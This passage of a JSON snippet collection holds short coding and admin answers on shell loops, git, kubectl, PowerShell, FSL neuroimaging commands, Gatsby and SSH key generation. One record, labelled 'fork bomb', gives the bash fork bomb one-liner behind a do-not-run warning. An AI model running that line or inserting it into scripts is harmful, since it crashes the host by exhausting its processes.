loop, then update step, then Boolean expression).  After the Boolean expression is false, the for loop terminates.\n// Unity for loop coroutine (repeat something every x seconds for x time)  Coroutine doThisCoroutine; // (Create a coroutine for stopping) int duration = 5 // (Duration, whatever you want it to be) float waitTime = 1 // Wait time to iterate in seconds, usually 1  void Awake(){      DoThisCoroutine = StartCoroutine(DoThis()); // Start the coroutine      }      IEnumerator DoThis(){      while (enabled){ // While the behavior is enabled,        for (int x = 0; x < Duration; x++){ // From zero until 5 incrementing by 1...            print(\"Doing This!\"); // Do whatever...   \t       yield return new WaitForSeconds(waitTime) // Every second.      \t}      }  }     \n double serviceCharge = 0;  if (cost >= 150)   {      serviceCharge = 0.15 * cost;   }  \n",
    "reg_date": "2021-10-11T22:04:38.000Z"
  },
  {
    "id": 1566,
    "keyword": null,
    "link": null,
    "title": " for loop change increment matlab",
    "description": "% Matlab For loop options  for n=initialVal:increment:finalVal; \t% do something end\n",
    "reg_date": "2021-10-11T22:04:39.000Z"
  },
  {
    "id": 1567,
    "keyword": null,
    "link": null,
    "title": " for loop in shell script",
    "description": "for i in {1..5} do    echo \"Welcome $i times\" done\n#!/bin/bash for (( c=1; c<=5; c++ )) do      echo \"Welcome $c times\" done \nyears=(2018 2019) days=(74 274)  for year in \"${years[@]}\"; do     for day in $(seq -w ${days[0]} ${days[1]}); do                echo $year                echo $day     done done\nfor VARIABLE in file1 file2 file3 do \tcommand1 on $VARIABLE \tcommand2 \tcommandN done\nfor i in `seq 1 10` do \techo $i #Do something here. done\n#!/bin/bash START=1 END=5 echo \"Countdown\"   for (( c=$START; c<=$END; c++ )) do \techo -n \"$c \" \tsleep 1 done   echo echo \"Boom!\"\n",
    "reg_date": "2021-10-11T22:04:39.000Z"
  },
  {
    "id": 1568,
    "keyword": null,
    "link": null,
    "title": " force delete a branch in git",
    "description": "git branch -D <branch_name> #This is use to force delete a branch that cannot be deleted with git branch -d <branch_name>\n",
    "reg_date": "2021-10-11T22:04:39.000Z"
  },
  {
    "id": 1569,
    "keyword": null,
    "link": null,
    "title": " force delete a folder in linux",
    "description": "# To remove non-empty directories and all the files without being prompted, use rm with the -r (recursive) and -f options: rm -rf dirname\n#In linux Terminal: \t#To make a directory: \t\tmkdir directory_name \t#To delete a directory:  \t\trmdir directory_name\n",
    "reg_date": "2021-10-11T22:04:39.000Z"
  },
  {
    "id": 1570,
    "keyword": null,
    "link": null,
    "title": " force delete pod kubernetes",
    "description": "kubectl delete --all pods\nkubectl delete pods <pod> --grace-period=0 --force \nkubectl delete pod podname\n",
    "reg_date": "2021-10-11T22:04:39.000Z"
  },
  {
    "id": 1571,
    "keyword": null,
    "link": null,
    "title": " force git to use ssh",
    "description": "git config --global url.\"git@github.com:\".insteadOf \"https://github.com/\" \n",
    "reg_date": "2021-10-11T22:04:39.000Z"
  },
  {
    "id": 1572,
    "keyword": null,
    "link": null,
    "title": " force logrotate linux",
    "description": "$ logrotate -vf CONFIG_FILE\n",
    "reg_date": "2021-10-11T22:04:39.000Z"
  },
  {
    "id": 1573,
    "keyword": null,
    "link": null,
    "title": " force to kill any process port ubuntu",
    "description": "sudo kill -9 $(sudo lsof -t -i:9001)   lsof   - list of files(Also used for to list related processes)  -t     - show only process ID  -i     - show only internet connections related process  :9001  - show only processes in this port number  kill   - command to kill the process  -9     - forcefully  sudo   - command to ask admin privilege(user id and password). \n",
    "reg_date": "2021-10-11T22:04:39.000Z"
  },
  {
    "id": 1574,
    "keyword": null,
    "link": null,
    "title": " force yarn to reinstall all packages",
    "description": "yarn install --check-files\n",
    "reg_date": "2021-10-11T22:04:39.000Z"
  },
  {
    "id": 1575,
    "keyword": null,
    "link": null,
    "title": " foreach loop powershell",
    "description": "foreach ($item in $items) { ## Do something to each item }\nForEach($user in $users){ \tWrite-Output $user }\n$Items = \"A\", \"B\", \"C\" #There are 2 ways to do this. #The Foreach Keyword foreach ($item in $items) { \tWrite-host $Item } #OR By Piping  #$_ is a dedicated varible for the object in the Pipe $Items | Foreach-Object { \tWrite-host $_ }\n> $array = @(\"item1\", \"item2\", \"item3\")   > foreach ($element in $array) { $element } item1 item2 item3   > $array | foreach { $_ } item1 item2 item3\nForEach-Object        [-InputObject <PSObject>]        [-Begin <ScriptBlock>]        [-Process] <ScriptBlock[]>        [-End <ScriptBlock>]        [-RemainingScripts <ScriptBlock[]>]        [-WhatIf]        [-Confirm]        [<CommonParameters>]\n",
    "reg_date": "2021-10-11T22:04:40.000Z"
  },
  {
    "id": 1576,
    "keyword": null,
    "link": null,
    "title": " foreach powershell",
    "description": "foreach ($item in $items) { ## Do something to each item }\nForEach($user in $users){ \tWrite-Output $user }\n$Items = \"A\", \"B\", \"C\" #There are 2 ways to do this. #The Foreach Keyword foreach ($item in $items) { \tWrite-host $Item } #OR By Piping  #$_ is a dedicated varible for the object in the Pipe $Items | Foreach-Object { \tWrite-host $_ }\n> $array = @(\"item1\", \"item2\", \"item3\")   > foreach ($element in $array) { $element } item1 item2 item3   > $array | foreach { $_ } item1 item2 item3\nForEach-Object        [-InputObject <PSObject>]        [-Begin <ScriptBlock>]        [-Process] <ScriptBlock[]>        [-End <ScriptBlock>]        [-RemainingScripts <ScriptBlock[]>]        [-WhatIf]        [-Confirm]        [<CommonParameters>]\n",
    "reg_date": "2021-10-11T22:04:40.000Z"
  },
  {
    "id": 1577,
    "keyword": null,
    "link": null,
    "title": " forever run python script",
    "description": "forever start -c python3 python_script.py\n",
    "reg_date": "2021-10-11T22:04:40.000Z"
  },
  {
    "id": 1578,
    "keyword": null,
    "link": null,
    "title": " fork bomb",
    "description": "# DO NOT RUN THIS :(){ :|:& };:\n",
    "reg_date": "2021-10-11T22:04:40.000Z"
  },
  {
    "id": 1579,
    "keyword": null,
    "link": null,
    "title": " format pendrive linux",
    "description": "# Identify USB drive in your system df -h  # Linux can't format devices that are mounted. Unmoute using sudo umount /dev/sdc1   # Format with file system # use any of sudo mkfs.vfat /dev/sdc1  sudo mkfs.ntfs /dev/sdc1  sudo mkfs.ext4 /dev/sdc1 \n",
    "reg_date": "2021-10-11T22:04:40.000Z"
  },
  {
    "id": 1580,
    "keyword": null,
    "link": null,
    "title": " free port in linux",
    "description": "netstat -tulnap        // list all ports and processes netstat -anp|grep \"port_number\"     // show port details sudo fuser -k Port_Number/tcp       // free the port needed # or lsof -n -i :'port-number' | grep LISTEN  // get port details # sample  response:  java   4744 (PID)  test  364u  IP0 asdasdasda   0t0  TCP *:port-number (LISTEN) kill -9 PID  // free port\n",
    "reg_date": "2021-10-11T22:04:40.000Z"
  },
  {
    "id": 1581,
    "keyword": null,
    "link": null,
    "title": " free up ram in linux ubuntu",
    "description": "echo 1 > /proc/sys/vm/drop_caches\n",
    "reg_date": "2021-10-11T22:04:40.000Z"
  },
  {
    "id": 1582,
    "keyword": null,
    "link": null,
    "title": " free video editor for ubuntu 20.04",
    "description": "sudo snap install blender --classic\n",
    "reg_date": "2021-10-11T22:04:40.000Z"
  },
  {
    "id": 1583,
    "keyword": null,
    "link": null,
    "title": " fsl T1w",
    "description": "#!/bin/sh  # FSL tool to crop the neck (usually for a T1w image):  robustfov -i T1w -r T1w_cropped\n#!/bin/sh  # fsl_anat will clean up the T1w image & normalize it to standard space # including bias correction, tissue segmentation & subcortical  # segmentation (FIRST), though it creates the image in 2mm MNI space. # Output is generated in a subdirectory named for the image but with the  # extension .anat (e.g., T1w.anat)  # Do all processing fsl_anat -i T1w   # Do not run reorient, segmentation or FIRST subcortical segmentation fsl_anat -i T1w --noreorient --noseg --nosubcortseg\n",
    "reg_date": "2021-10-11T22:04:40.000Z"
  },
  {
    "id": 1584,
    "keyword": null,
    "link": null,
    "title": " fsl anat",
    "description": "#!/bin/sh  # fsl_anat will clean up the T1w image & normalize it to standard space # including bias correction, tissue segmentation & subcortical  # segmentation (FIRST), though it creates the image in 2mm MNI space. # Output is generated in a subdirectory named for the image but with the  # extension .anat (e.g., T1w.anat)  # Do all processing fsl_anat -i T1w   # Do not run reorient, segmentation or FIRST subcortical segmentation fsl_anat -i T1w --noreorient --noseg --nosubcortseg\n",
    "reg_date": "2021-10-11T22:04:41.000Z"
  },
  {
    "id": 1585,
    "keyword": null,
    "link": null,
    "title": " fsl atlas",
    "description": "#!/bin/sh  # List co-ordinates of each labeled region in an atlas with fslstats.  # Use preoption -K < indexMask > will generate seperate n submasks from  # indexMask, for indexvalues 1..n where n is the maximum index value  # in indexMask, and generate statistics for each submask.  fslstats -K myLabelAtlas myLabelAtlas -x \n",
    "reg_date": "2021-10-11T22:04:41.000Z"
  },
  {
    "id": 1586,
    "keyword": null,
    "link": null,
    "title": " fsl bet",
    "description": "#!/bin/sh  # FSL tool to extract the brain:  bet T1w_cropped T1w_brain\n",
    "reg_date": "2021-10-11T22:04:41.000Z"
  },
  {
    "id": 1587,
    "keyword": null,
    "link": null,
    "title": " fsl bet brain extraction",
    "description": "#!/bin/sh  # FSL tool to extract the brain:  bet T1w_cropped T1w_brain\n#!/bin/sh  # fsl_anat will clean up the T1w image & normalize it to standard space # including bias correction, tissue segmentation & subcortical  # segmentation (FIRST), though it creates the image in 2mm MNI space. # Output is generated in a subdirectory named for the image but with the  # extension .anat (e.g., T1w.anat)  # Do all processing fsl_anat -i T1w   # Do not run reorient, segmentation or FIRST subcortical segmentation fsl_anat -i T1w --noreorient --noseg --nosubcortseg\n",
    "reg_date": "2021-10-11T22:04:41.000Z"
  },
  {
    "id": 1588,
    "keyword": null,
    "link": null,
    "title": " fsl flirt",
    "description": "#!/bin/sh  : <<COMMENTBLOCK  Purpose:    Run flirt to reslice an image into a new space Input:     \timg = image to be resliced,              ref = a reference image (we will reslice INTO this new space)             -init mat = a mat (matrix) file that expresses the relationship between              the input space and the output space Output:     -out = image in new space  COMMENTBLOCK      flirt -in img -datatype float -ref ${ref} -init ${mat} \\     -applyxfm -out ${output}\n#!/bin/sh  # Use FSL flirt to register label masks  # with nearest neighbor interpolation.  # because the label values should never be interpolated. # This example assumes:  # an existing 0.5mm standard brain (MNI152_T1_0.5mm_brain) # an existing flirt matrix from 1 mm to 0.5 mm (stand1stand0.5.mat)   flirt -in atlas -datatype int -ref MNI152_T1_0.5mm_brain \\  -interp nearestneighbour \\  -init stand1stand0.5.mat -applyxfm -out atlas_0.5mm\n#!/bin/sh  # Some viewers (like MRIcron) do not handle anisotropic voxels well.  # FSL can easily convert an image with anisotropic voxels into one  # with isotropic voxels in the same space using -applyisoxfm  # reslice current image into 1mm isotropic flirt -in anat_CT_axial -ref anat_CT_axial -applyisoxfm 1 -out anat_CT_axial_1mm  # reslice current image into 0.5 mm isotropic voxels. flirt -in anat_CT_axial -ref anat_CT_axial -applyisoxfm 0.5 -out anat_CT_axial_0.5mm\n",
    "reg_date": "2021-10-11T22:04:41.000Z"
  },
  {
    "id": 1589,
    "keyword": null,
    "link": null,
    "title": " fsl label",
    "description": "#!/bin/sh  # List co-ordinates of each labeled region in an atlas with fslstats.  # Use preoption -K < indexMask > will generate seperate n submasks from  # indexMask, for indexvalues 1..n where n is the maximum index value  # in indexMask, and generate statistics for each submask.  fslstats -K myLabelAtlas myLabelAtlas -x \n",
    "reg_date": "2021-10-11T22:04:41.000Z"
  },
  {
    "id": 1590,
    "keyword": null,
    "link": null,
    "title": " fsl nans",
    "description": "#!/bin/sh  # Any image containing NANs may not be read correctly  # by fslmaths or fslstats. # -nan : replace NaNs (improper numbers) with 0  fslmaths img -nan img_no_nans\n",
    "reg_date": "2021-10-11T22:04:41.000Z"
  },
  {
    "id": 1591,
    "keyword": null,
    "link": null,
    "title": " fsl nonlinear registration",
    "description": "#!/bin/sh  # Use nonlinear registration tools  # to register from native space to standard space.  # 1) First run FSL linear registration (flirt). # to produce an affine transform matrix (*.mat)  # of the T1w image to MNI space.   flirt -ref MNI152_T1_1mm_brain -in T1w_brain -omat affine_transform.mat  # 2) Run fnirt to create the warp field (--cout=nonlinear_transform) # by passing in the linear transform. This is slow (~15 minutes). # The nonlinear transform is a NIfTI image containing a gradient.  fnirt --in=T1w --aff=affine_transform.mat \\   --cout=nonlinear_transform --config=T1_2_MNI152_2mm  # 3) Once we have the warp field, it is quick to apply it to the  # T1w image to create the T1w image in MNI space:  applywarp --ref=MNI152_T1_1mm --in=T1w \\   --warp=nonlinear_transform --out=T1w_MNI  #---------------------------------------------------  # applywarp: apply a warp file to another image # convertwarp: combine a warp file and a mat file to generate a new warp file # invwarp: swap the warping direction  #---------------------------------------------------  # applywarp example: warp the MNI space image into the B0 dti space # This example requires an existing warp image created by fnirt  applywarp -r img_B0 -i img_mni  --out=img_mni2B0  --warp=mni_b0    # warp the 4D functional image into MNI space # The reference is the MNI image (-r MNI_stand) # The input is the native space fMRI image (-i fMRI_4d) # The output is the fMRI image warped into the MNI space (--out=fMRI_4d_mni) # The warp image must already exist (--warp=fMRI_mni)  applywarp -r MNI_stand -i fMRI_4d --out=fMRI_4d_mni --warp=fMRI_mni   #-----------------------------------------------------  # convertwarp: create a warp image (-o run_mni) from an existing warp  # image (-w str_mni) and a mat file (-m run_str). Use a reference  # (-r stand) equivalent to the one used to generate the warp.  convertwarp -r stand -w str_mni -m run_str.mat -o run_mni #-----------------------------------------------------  # invwarp: invert the run_mni warp file to create the new  # mni_run warp file. -r is the new reference file name  # (determines output FOV and pixdims)  invwarp -w run_mni -o mni_run -r sub-001_run1_basevolreg  \n",
    "reg_date": "2021-10-11T22:04:41.000Z"
  },
  {
    "id": 1592,
    "keyword": null,
    "link": null,
    "title": " fsl orient",
    "description": "#!/bin/sh  # fslreorient2std is an FSL tool for reorienting the image to match the # approximate orientation of the standard template images (MNI152). # It only applies 0, 90, 180 or 270 degree rotations. # It is not a registration tool. # It requires NIfTI images with valid orientation information # in them (seen by valid labels in FSLeyes). This tool # assumes the labels are correct - if not, fix that before using this. # Specify the input and output name!  fslreorient2std T1w T1w\n",
    "reg_date": "2021-10-11T22:04:41.000Z"
  },
  {
    "id": 1593,
    "keyword": null,
    "link": null,
    "title": " fsl reg",
    "description": "#!/bin/sh  # Use nonlinear registration tools  # to register from native space to standard space.  # 1) First run FSL linear registration (flirt). # to produce an affine transform matrix (*.mat)  # of the T1w image to MNI space.   flirt -ref MNI152_T1_1mm_brain -in T1w_brain -omat affine_transform.mat  # 2) Run fnirt to create the warp field (--cout=nonlinear_transform) # by passing in the linear transform. This is slow (~15 minutes). # The nonlinear transform is a NIfTI image containing a gradient.  fnirt --in=T1w --aff=affine_transform.mat \\   --cout=nonlinear_transform --config=T1_2_MNI152_2mm  # 3) Once we have the warp field, it is quick to apply it to the  # T1w image to create the T1w image in MNI space:  applywarp --ref=MNI152_T1_1mm --in=T1w \\   --warp=nonlinear_transform --out=T1w_MNI  #---------------------------------------------------  # applywarp: apply a warp file to another image # convertwarp: combine a warp file and a mat file to generate a new warp file # invwarp: swap the warping direction  #---------------------------------------------------  # applywarp example: warp the MNI space image into the B0 dti space # This example requires an existing warp image created by fnirt  applywarp -r img_B0 -i img_mni  --out=img_mni2B0  --warp=mni_b0    # warp the 4D functional image into MNI space # The reference is the MNI image (-r MNI_stand) # The input is the native space fMRI image (-i fMRI_4d) # The output is the fMRI image warped into the MNI space (--out=fMRI_4d_mni) # The warp image must already exist (--warp=fMRI_mni)  applywarp -r MNI_stand -i fMRI_4d --out=fMRI_4d_mni --warp=fMRI_mni   #-----------------------------------------------------  # convertwarp: create a warp image (-o run_mni) from an existing warp  # image (-w str_mni) and a mat file (-m run_str). Use a reference  # (-r stand) equivalent to the one used to generate the warp.  convertwarp -r stand -w str_mni -m run_str.mat -o run_mni #-----------------------------------------------------  # invwarp: invert the run_mni warp file to create the new  # mni_run warp file. -r is the new reference file name  # (determines output FOV and pixdims)  invwarp -w run_mni -o mni_run -r sub-001_run1_basevolreg  \n#!/bin/sh  # Use FSL flirt to register label masks  # with nearest neighbor interpolation.  # because the label values should never be interpolated. # This example assumes:  # an existing 0.5mm standard brain (MNI152_T1_0.5mm_brain) # an existing flirt matrix from 1 mm to 0.5 mm (stand1stand0.5.mat)   flirt -in atlas -datatype int -ref MNI152_T1_0.5mm_brain \\  -interp nearestneighbour \\  -init stand1stand0.5.mat -applyxfm -out atlas_0.5mm\n#!/bin/sh  : <<COMMENTBLOCK  Purpose:    Run flirt to reslice an image into a new space Input:     \timg = image to be resliced,              ref = a reference image (we will reslice INTO this new space)             -init mat = a mat (matrix) file that expresses the relationship between              the input space and the output space Output:     -out = image in new space  COMMENTBLOCK      flirt -in img -datatype float -ref ${ref} -init ${mat} \\     -applyxfm -out ${output}\n#!/bin/sh  # Some viewers (like MRIcron) do not handle anisotropic voxels well.  # FSL can easily convert an image with anisotropic voxels into one  # with isotropic voxels in the same space using -applyisoxfm  # reslice current image into 1mm isotropic flirt -in anat_CT_axial -ref anat_CT_axial -applyisoxfm 1 -out anat_CT_axial_1mm  # reslice current image into 0.5 mm isotropic voxels. flirt -in anat_CT_axial -ref anat_CT_axial -applyisoxfm 0.5 -out anat_CT_axial_0.5mm\n",
    "reg_date": "2021-10-11T22:04:42.000Z"
  },
  {
    "id": 1594,
    "keyword": null,
    "link": null,
    "title": " fsl reorient",
    "description": "#!/bin/sh  # fslreorient2std is an FSL tool for reorienting the image to match the # approximate orientation of the standard template images (MNI152). # It only applies 0, 90, 180 or 270 degree rotations. # It is not a registration tool. # It requires NIfTI images with valid orientation information # in them (seen by valid labels in FSLeyes). This tool # assumes the labels are correct - if not, fix that before using this. # Specify the input and output name!  fslreorient2std T1w T1w\n",
    "reg_date": "2021-10-11T22:04:43.000Z"
  },
  {
    "id": 1595,
    "keyword": null,
    "link": null,
    "title": " fsl robustfov",
    "description": "#!/bin/sh  # FSL tool to crop the neck (usually for a T1w image):  robustfov -i T1w -r T1w_cropped\n",
    "reg_date": "2021-10-11T22:04:44.000Z"
  },
  {
    "id": 1596,
    "keyword": null,
    "link": null,
    "title": " fsl scale",
    "description": "#!/bin/sh  if [ $# -lt 1 ] ; then   echo \"Usage: $0 <filename>\" ;   exit 1 ; fi  img=$(remove_ext ${1})  min=$(fslstats ${img} -R | awk '{ print $1 }') max=$(fslstats ${img} -R | awk '{ print $2 }')  scaling=$(echo \"scale=5; 255.0 / ( $max - $min )\" | bc)  fslmaths ${img} -sub ${min} -mul ${scaling} ${img}_scaled  # If you want all the values to be integers, then change  # the odt (output datatype): fslmaths ${img}_scaled ${img}_int_scaled -odt int\n",
    "reg_date": "2021-10-11T22:04:44.000Z"
  },
  {
    "id": 1597,
    "keyword": null,
    "link": null,
    "title": " fsl stats",
    "description": "#!/bin/sh  if [ $# -lt 1 ] ; then   echo \"Usage: $0 <filename>\" ;   exit 1 ; fi  img=$(remove_ext ${1})  min=$(fslstats ${img} -R | awk '{ print $1 }') max=$(fslstats ${img} -R | awk '{ print $2 }')  scaling=$(echo \"scale=5; 255.0 / ( $max - $min )\" | bc)  fslmaths ${img} -sub ${min} -mul ${scaling} ${img}_scaled  # If you want all the values to be integers, then change  # the odt (output datatype): fslmaths ${img}_scaled ${img}_int_scaled -odt int\n#!/bin/sh  # Get mean (-M) and standard deviation (-S) of a masked (-k) region  # (e.g., a statistical image)  fslstats img_stats -k mask -M -S  # Test if an image is a binary mask: # -M gets the mean of non-zero voxels.   # -S gets the standard deviation of non-zero voxels. # Beware of images containing NANs! # The mean should be 1  # The standard deviation should be 0   fslstats img_mask -M -S \n#!/bin/sh  # List co-ordinates of each labeled region in an atlas with fslstats.  # Use preoption -K < indexMask > will generate seperate n submasks from  # indexMask, for indexvalues 1..n where n is the maximum index value  # in indexMask, and generate statistics for each submask.  fslstats -K myLabelAtlas myLabelAtlas -x \n",
    "reg_date": "2021-10-11T22:04:44.000Z"
  },
  {
    "id": 1598,
    "keyword": null,
    "link": null,
    "title": " fslmaths dilation",
    "description": "# FSL: fsl dilate or fsl erode:  # Kernel operations (set BEFORE filtering operation if desired):  # -kernel 3D : 3x3x3 box centered on target voxel (set as default kernel) # -kernel 2D : 3x3x1 box centered on target voxel  # Spatial Filtering operations:  # N.B. all options apart from -s use the default kernel or that  # previously specified by -kernel  # -dilM : Mean Dilation of non-zero voxels  # -dilD : Modal Dilation of non-zero voxels  # -dilF : Maximum filtering of all voxels  # -dilall : Apply -dilM repeatedly until the entire FOV is covered  # -ero : Erode by zeroing non-zero voxels when zero voxels found in kernel  # -eroF : Minimum filtering of all voxels   # dilation example  # -odt sets the output data type.  # odt options are char short int float double fslmaths mask -kernel 3D -dilM mask -odt short  # erosion example fslmaths mask -kernel 2D -ero mask -odt short\n",
    "reg_date": "2021-10-11T22:04:44.000Z"
  },
  {
    "id": 1599,
    "keyword": null,
    "link": null,
    "title": " fslmaths erode",
    "description": "# FSL: fsl dilate or fsl erode:  # Kernel operations (set BEFORE filtering operation if desired):  # -kernel 3D : 3x3x3 box centered on target voxel (set as default kernel) # -kernel 2D : 3x3x1 box centered on target voxel  # Spatial Filtering operations:  # N.B. all options apart from -s use the default kernel or that  # previously specified by -kernel  # -dilM : Mean Dilation of non-zero voxels  # -dilD : Modal Dilation of non-zero voxels  # -dilF : Maximum filtering of all voxels  # -dilall : Apply -dilM repeatedly until the entire FOV is covered  # -ero : Erode by zeroing non-zero voxels when zero voxels found in kernel  # -eroF : Minimum filtering of all voxels   # dilation example  # -odt sets the output data type.  # odt options are char short int float double fslmaths mask -kernel 3D -dilM mask -odt short  # erosion example fslmaths mask -kernel 2D -ero mask -odt short\n",
    "reg_date": "2021-10-11T22:04:44.000Z"
  },
  {
    "id": 1600,
    "keyword": null,
    "link": null,
    "title": " fslmaths erosion",
    "description": "# FSL: fsl dilate or fsl erode:  # Kernel operations (set BEFORE filtering operation if desired):  # -kernel 3D : 3x3x3 box centered on target voxel (set as default kernel) # -kernel 2D : 3x3x1 box centered on target voxel  # Spatial Filtering operations:  # N.B. all options apart from -s use the default kernel or that  # previously specified by -kernel  # -dilM : Mean Dilation of non-zero voxels  # -dilD : Modal Dilation of non-zero voxels  # -dilF : Maximum filtering of all voxels  # -dilall : Apply -dilM repeatedly until the entire FOV is covered  # -ero : Erode by zeroing non-zero voxels when zero voxels found in kernel  # -eroF : Minimum filtering of all voxels   # dilation example  # -odt sets the output data type.  # odt options are char short int float double fslmaths mask -kernel 3D -dilM mask -odt short  # erosion example fslmaths mask -kernel 2D -ero mask -odt short\n",
    "reg_date": "2021-10-11T22:04:44.000Z"
  },
  {
    "id": 1601,
    "keyword": null,
    "link": null,
    "title": " fslreorient2std",
    "description": "#!/bin/sh  # fslreorient2std is an FSL tool for reorienting the image to match the # approximate orientation of the standard template images (MNI152). # It only applies 0, 90, 180 or 270 degree rotations. # It is not a registration tool. # It requires NIfTI images with valid orientation information # in them (seen by valid labels in FSLeyes). This tool # assumes the labels are correct - if not, fix that before using this. # Specify the input and output name!  fslreorient2std T1w T1w\n",
    "reg_date": "2021-10-11T22:04:44.000Z"
  },
  {
    "id": 1602,
    "keyword": null,
    "link": null,
    "title": " ftp: connect: Connection refused",
    "description": "ftp public_ip port_number\n",
    "reg_date": "2021-10-11T22:04:44.000Z"
  },
  {
    "id": 1603,
    "keyword": null,
    "link": null,
    "title": " ftp command not found mac",
    "description": "brew install inetutils\n",
    "reg_date": "2021-10-11T22:04:44.000Z"
  },
  {
    "id": 1604,
    "keyword": null,
    "link": null,
    "title": " full path of file linux",
    "description": "readlink -f file.txt\nreadlink -f file.txt #file readlink -f Downloads #folder\nls | xargs readlink -f \n",
    "reg_date": "2021-10-11T22:04:45.000Z"
  },
  {
    "id": 1605,
    "keyword": null,
    "link": null,
    "title": " gatsby-plugin-styled-components",
    "description": "npm install --save gatsby-plugin-styled-components styled-components babel-plugin-styled-components  # yarn  yarn add  gatsby-plugin-styled-components styled-components babel-plugin-styled-components   # Edit gatsby-config.js  module.exports = {   plugins: [     {       resolve: `gatsby-plugin-styled-components`,       options: {         // Add any options here       },     },   ], }\n",
    "reg_date": "2021-10-11T22:04:45.000Z"
  },
  {
    "id": 1606,
    "keyword": null,
    "link": null,
    "title": " gatsby js install",
    "description": "npm install -g gatsby-cli   //Create new project  gatsby new [gatsby-project-name] https://github.com/gatsbyjs/gatsby-starter-hello-world cd [gatsby-project-name]  //initialize developer server gatsby develop   //create production build the project gatsby build gatsby serve\n//Create new project  gatsby new [gatsby-project-name] https://github.com/gatsbyjs/gatsby-starter-hello-world cd [gatsby-project-name]  //initialize developer server gatsby develop   //create production build the project gatsby build gatsby serve\nnpx gatsby new gatsby-site https://github.com/gatsbyjs/gatsby-starter-default\n",
    "reg_date": "2021-10-11T22:04:45.000Z"
  },
  {
    "id": 1607,
    "keyword": null,
    "link": null,
    "title": " gatsby starter hello world",
    "description": "gatsby new gatsby-starter-hello-world https://github.com/gatsbyjs/gatsby-starter-hello-world\n",
    "reg_date": "2021-10-11T22:04:45.000Z"
  },
  {
    "id": 1608,
    "keyword": null,
    "link": null,
    "title": " gcloud disable interactive prompts",
    "description": "gcloud config set core/disable_prompts 1\n",
    "reg_date": "2021-10-11T22:04:45.000Z"
  },
  {
    "id": 1609,
    "keyword": null,
    "link": null,
    "title": " gcloud list current CLI Configuration",
    "description": "gcloud config list\n",
    "reg_date": "2021-10-11T22:04:45.000Z"
  },
  {
    "id": 1610,
    "keyword": null,
    "link": null,
    "title": " gdebi",
    "description": "# what is gdebi: # Gdebi is a app that helps you install deb files  # more effectively by handling dependencies.  # to install gdebi  sudo apt install gdebi  # to install .deb file using gdebi  sudo gdebi <path_to_deb_file>\n",
    "reg_date": "2021-10-11T22:04:45.000Z"
  },
  {
    "id": 1611,
    "keyword": null,
    "link": null,
    "title": " generate 6 digit random number in codeigniter",
    "description": "$otp = mt_rand(100000, 999999); // generate 6 digit rando numer <input type=\"text\" name=\"authType\" id=\"authType\" value=\"$otp\" placeholder=\"Enter OTP\">\n",
    "reg_date": "2021-10-11T22:04:45.000Z"
  },
  {
    "id": 1612,
    "keyword": null,
    "link": null,
    "title": " generate crt and key openssl",
    "description": "openssl req -x509 -newkey rsa:4096 -sha256 -days 3650 -nodes \\   -keyout example.key -out example.crt -subj \"/CN=example.com\" \\   -addext \"subjectAltName=DNS:example.com,DNS:www.example.net,IP:10.0.0.1\"\n",
    "reg_date": "2021-10-11T22:04:46.000Z"
  },
  {
    "id": 1613,
    "keyword": null,
    "link": null,
    "title": " generate py file from ui",
    "description": "pyuic5 -x -o pyfilename.py design.ui\n",
    "reg_date": "2021-10-11T22:04:46.000Z"
  },
  {
    "id": 1614,
    "keyword": null,
    "link": null,
    "title": " generate spec file using pyinstaller",
    "description": "pyi-makespec [--onefile] main.py\n",
    "reg_date": "2021-10-11T22:04:46.000Z"
  },
  {
    "id": 1615,
    "keyword": null,
    "link": null,
    "title": " generate ssh key paitr",
    "description": "$ ssh-keygen -t rsa -b 4096 -C \"your_email@example.com\"\nssh-keygen -t rsa -C \"your_email@example.com\"\n",
    "reg_date": "2021-10-11T22:04:46.000Z"
  },
  {
    "id": 1616,
    "keyword": null,
    "link": null,
    "title": " generating ssh key",
    "description": "$ ssh-keygen -t rsa -b 4096 -C \"your_email@example.com\"\nssh-keygen -t rsa -C \"your_email@example.com\"\n$ cat ~/.ssh/id_rsa.pub \n",
    "reg_date": "2021-10-11T22:04:46.000Z"
  },
  {
    "id": 1617,
    "keyword": null,
    "link": null,
    "title": " genrate shh key github",
    "description": "$ ssh-keygen -t rsa -b 4096 -C \"your_email@example.com\"\n",
    "reg_date": "2021-10-11T22:04:46.000Z"
  },
  {
    "id": 1618,
    "keyword": null,
    "link": null,
    "title": " gestures in ubuntu",
    "description": "##### Gestures in Ubuntu #####  ## Steps to Install  sudo gpasswd -a $USER input sudo apt install libinput-tools xdotool  ## make a text-file for saving your gestures like the same below... nano .config/libinput-gestures.conf  ## add all gestures below into that file gesture swipe left 3 xdotool key alt+Right gesture swipe right 3 xdotool key alt+Left gesture swipe right 4 xdotool key ctrl+alt+Left gesture swipe left 4 xdotool key ctrl+alt+Right gesture swipe up 3 xdotool key super gesture swipe down 3 xdotool key super+d  ## After doing above steps type these commands in terminal and logout... libinput-gestures-setup start  libinput-gestures-setup autostart  ### Enjoy you are done!!!\n",
    "reg_date": "2021-10-11T22:04:46.000Z"
  },
  {
    "id": 1619,
    "keyword": null,
    "link": null,
    "title": " get-docker sh",
    "description": " curl -fsSL https://get.docker.com -o get-docker.sh  \n",
    "reg_date": "2021-10-11T22:04:46.000Z"
  },
  {
    "id": 1620,
    "keyword": null,
    "link": null,
    "title": " get all directories name using cmd and save to text",
    "description": "Open a command prompt (Start -> Run -> cmd Enter )  Navigate ( cd ) to the directory whose files you want to list.  Enter dir > output_file_name (e.g., dir > C:\\dir. txt )  and press Enter .\n",
    "reg_date": "2021-10-11T22:04:47.000Z"
  },
  {
    "id": 1621,
    "keyword": null,
    "link": null,
    "title": " get all environment variables",
    "description": "printenv\n#show all variable printenv  #result one variable echo $LOCALAPPDATA\n",
    "reg_date": "2021-10-11T22:04:47.000Z"
  },
  {
    "id": 1622,
    "keyword": null,
    "link": null,
    "title": " get all module npm global",
    "description": "npm list -g --depth 0\n",
    "reg_date": "2021-10-11T22:04:47.000Z"
  },
  {
    "id": 1623,
    "keyword": null,
    "link": null,
    "title": " get all remote branches",
    "description": "# track all remote branches: git branch -r | grep -v '\\->' | while read remote; do git branch --track \"${remote#origin/}\" \"$remote\"; done # update all local copies of remote branches git fetch --all # update all local tracking branches git pull --all \ngit branch -r \ngit fetch --all \nYou can fetch all branches from all remotes like this: git fetch --all \n$ git branch -a. If you require only listing the remote branches from Git Bash then use this command: $ git branch -r. You may also use the show-branch command for seeing the branches and their commits as follows: $ git show-branch.\ngit remote show <remote-name> \n",
    "reg_date": "2021-10-11T22:04:47.000Z"
  },
  {
    "id": 1624,
    "keyword": null,
    "link": null,
    "title": " get all the branch in git",
